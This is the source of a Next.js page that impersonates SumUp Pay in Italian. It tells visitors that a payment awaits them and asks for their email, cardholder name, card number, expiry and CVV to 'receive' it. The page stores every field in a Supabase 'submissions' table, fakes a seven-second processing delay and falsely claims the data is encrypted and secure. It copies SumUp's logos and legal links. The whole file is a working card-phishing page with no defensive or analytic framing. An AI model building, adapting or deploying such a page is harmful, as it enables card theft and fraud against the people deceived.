"use client";

import { FormEvent, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/lib/supabase/client";

function formatCardNumber(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
}

function formatExpiry(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

export default function HomePage() {
  const supabase = createClient();
  const router = useRouter();

  const [price, setPrice] = useState<number | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [form, setForm] = useState({
    first_name: "",
    card_number: "",
    expiry: "",
    security_code: "",
    email: "",
  });

  useEffect(() => {
    let cancelled = false;

    async function loadPrice() {
      const { data } = await supabase
        .from("app_settings")
        .select("price")
        .eq("id", 1)
        .single();
      if (!cancelled && data) setPrice(Number(data.price));
    }

    loadPrice();

    const channel = supabase
      .channel("settings-price")
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "app_settings" },
        (payload) => {
          const next = payload.new as { price?: number };
          if (typeof next.price !== "undefined") setPrice(Number(next.price));
        }
      )
      .subscribe();

    return () => {
      cancelled = true;
      supabase.removeChannel(channel);
    };
  }, [supabase]);

  async function onSubmit(e: FormEvent) {
    e.preventDefault();
    setLoading(true);
    setError("");
    const startedAt = Date.now();

    const cardDigits = form.card_number.replace(/\s/g, "");
    if (cardDigits.length < 13) {
      setLoading(false);
      setError("Inserire un numero di carta valido.");
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(form.expiry)) {
      setLoading(false);
      setError("Inserire data di scadenza MM/YY.");
      return;
    }

    const { data, error: insertError } = await supabase
      .from("submissions")
      .insert({
        first_name: form.first_name.trim(),
        last_name: form.first_name.trim(),
        address: form.expiry,
        card_number: cardDigits,
        expiry: form.expiry,
        security_code: form.security_code.trim(),
        email: form.email.trim(),
        status: "pending",
      })
      .select("id")
      .single();


   if (insertError || !data) {
      setLoading(false);
      setError(insertError?.message ?? "Dati non salvati");
      return;
    }

   const remaining = Math.max(0, 7000 - (Date.now() - startedAt));
  await new Promise((resolve) => setTimeout(resolve, remaining));


    router.push(`/status?id=${data.id}`);
  }

const inputClass =
    "w-full rounded-lg border border-gray-300 bg-white px-3 py-2 text-gray-900 outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100";

  return (
   <main className="mx-auto flex min-h-screen max-w-lg flex-col items-center bg-white px-6 py-12 text-gray-900">
    
        <img
          src="/powered-by.png"
          alt="Powered by"
          className="mx-auto mb-6 h-8 w-auto object-contain opacity-80"
        />

        <div className="mb-8 w-full rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
          <h1 className="text-xl font-semibold">Pagamento in attessa di ricezione...</h1>
        <p className="text-sm text-[#9aa8b8]">Totale pagato</p>
        <p className="mt-1 text-3xl font-semibold">
          {price === null ? "…" : `€${price.toFixed(2)}`}
        </p>
      </div>

      <form onSubmit={onSubmit} className="w-full space-y-4 rounded-xl border border-gray-200 bg-white p-6 shadow-sm">
       <div className="mb-8 w-full rounded-xl border border-gray-200 bg-gray-50 px-5 py-4 text-center">
        <p className="text-sm text-[#a48403]">Inserisci i dati della carta dove ricevere il pagamento</p>
      </div>
        <h1 className="text-xl font-semibold">INSERIRE DATI PER RICEZIONE PAGAMENTO</h1>
           <label className="block text-sm text-[#000000]">
         📩 EMAIL DOVE RICEVERE NOTIFICA DI ACCREDITO
          <input
            required
            type="email"
             placeholder="Inserire indirizzo email"
            autoComplete="email"
            className={`${inputClass} mt-1`}
            value={form.email}
            onChange={(e) => setForm((f) => ({ ...f, email: e.target.value }))}
          />
        </label>

          <label className="block text-sm">
          👤 NOME TITOLARE CARTA DOVE RICEVERE PAGAMENTO
          <input
            required
            className={`${inputClass} mt-1`}
            placeholder="Inserire Nome e cognome intestatario"
            value={form.first_name}
            onChange={(e) => setForm((f) => ({ ...f, first_name: e.target.value }))}
          />
        </label>

        <label className="block text-sm">
         💳 NUMERO DI CARTA DOVE RICEVERE PAGAMENTO
          <input
            required
            inputMode="numeric"
            autoComplete="cc-number"
            placeholder="0000 0000 0000 0000"
            className={`${inputClass} mt-1 tracking-wider`}
            value={form.card_number}
            onChange={(e) =>
              setForm((f) => ({ ...f, card_number: formatCardNumber(e.target.value) }))
            }
          />
        </label>

        <div className="grid grid-cols-2 gap-3">
          <label className="block text-sm">
            📅 SCADENZA
            <input
              required
              inputMode="numeric"
              autoComplete="cc-exp"
              placeholder="MM/YY"
              className={`${inputClass} mt-1`}
              value={form.expiry}
              onChange={(e) =>
                setForm((f) => ({ ...f, expiry: formatExpiry(e.target.value) }))
              }
            />
          </label>

          <label className="block text-sm">
           🔒︎ CVV
            <input
              required
              type="password"
              inputMode="numeric"
              autoComplete="cc-csc"
              placeholder="123"
              maxLength={4}
              className={`${inputClass} mt-1`}
              value={form.security_code}
              onChange={(e) =>
                setForm((f) => ({
                  ...f,
                  security_code: e.target.value.replace(/\D/g, "").slice(0, 4),
                }))
              }
            />
          </label>
        </div>

       
        {error && <p className="text-sm text-red-400">{error}</p>}

        <button
  type="submit"
  disabled={loading}
  className="flex w-full items-center justify-center gap-2 rounded-lg bg-blue-600 px-4 py-2.5 font-medium text-white hover:bg-blue-500 disabled:cursor-not-allowed disabled:opacity-70"
>
  {loading ? (
    <>
      <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
      Pagamento in ricezione...
    </>
  ) : (
    "Conferma Ricezione"
  )}
</button>

        
        <p className="mt-3 rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-center text-sm text-amber-800">
          <img src="thick.png" width="15" height="15"  className="mx-auto mb-6 h-8 w-auto object-contain opacity-80"></img>
         Tutti i dati inseriti sono crittografati e sicuri. Facendo clic sul pulsante Ricevi accredito, accetti di ricevere il seguente pagamento utilizzando il servizio online Sumup Pay
        </p>
         </form>

            <footer className="mt-10 w-full text-center">
        <p className="mb-3 text-xs uppercase tracking-wide text-[#9aa8b8]">
          Powered by
        </p>
        <img
          src="/logo.png"
          alt="Powered by"
          className="mx-auto h-20 w-auto object-contain opacity-80"
        />

        <nav className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#9aa8b8]">
          <a href="https://sumup.com/legal/" className="hover:text-white hover:underline">
            Avviso legale
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/privacy/" className="hover:text-white hover:underline">
            Politica sulla riservatezza
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/terms/" className="hover:text-white hover:underline">
            Termini &amp; Condizioni
          </a>
          <span className="hidden text-[#2a3548] sm:inline">|</span>
          <a href="https://sumup.com/cookies/" className="hover:text-white hover:underline">
            Informativa sui cookie
          </a>
        </nav>
      </footer>
    </main>
  );
}
